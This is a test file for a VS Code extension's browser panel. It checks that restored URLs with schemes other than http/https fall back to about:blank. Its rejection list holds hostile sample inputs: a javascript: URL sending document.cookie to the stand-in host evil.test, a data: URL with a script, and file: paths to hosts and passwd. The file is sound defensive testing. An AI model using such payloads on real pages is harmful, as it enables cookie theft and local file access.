import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import { restoredBrowserUrl } from '../extension';

describe('S8 — a restored URL that is not http/https is not navigated to', () => {
  it('rejects every non-http(s) scheme and falls back to about:blank', () => {
    // The panel persists every PAGE-CONTROLLED url via vscode.setState, so a hostile page can plant
    // any of these and have it navigated on the next window reload.
    for (const url of [
      'file:///c:/Windows/System32/drivers/etc/hosts',
      'vscode-file://vscode-app/etc/passwd',
      'javascript:fetch("http://evil.test?c="+document.cookie)',
      'data:text/html,<script>alert(1)</script>',
      'chrome://settings',
      'about:config',
      'ftp://evil.test/x',
      'HTTPS\u200b://not-really.test',
    ]) {
      expect(restoredBrowserUrl({ url })).toBe('about:blank');
    }
  });

  it('passes http and https through unchanged, including ports, paths and queries', () => {
    for (const url of [
      'http://example.test/',
      'https://example.test/deep/path?q=1&r=2#frag',
      'http://127.0.0.1:3000/app',
      'https://user:pass@example.test/',
    ]) {
      expect(restoredBrowserUrl({ url })).toBe(url);
    }
  });

  it('never throws on a malformed, missing or non-string url', () => {
    for (const state of [null, undefined, {}, { url: '' }, { url: 'not a url' }, { url: 42 }, { url: {} }, 'nonsense', []]) {
      expect(restoredBrowserUrl(state)).toBe('about:blank');
    }
  });

  it('the deserializer routes the persisted state through the validator, not through `|| about:blank`', () => {
    const src = readFileSync(join(__dirname, '..', 'extension.ts'), 'utf8');
    const deserializer = src.slice(src.indexOf('damocles-browser-view'));

    expect(deserializer).toContain('restoredBrowserUrl');
    // The pre-slice check was `(state as {url?: string})?.url || 'about:blank'` — a scheme-blind
    // truthiness test. It must not survive alongside the validator.
    expect(deserializer.slice(0, 600)).not.toMatch(/\?\.url\s*\|\|\s*['"]about:blank['"]/);
  });
});
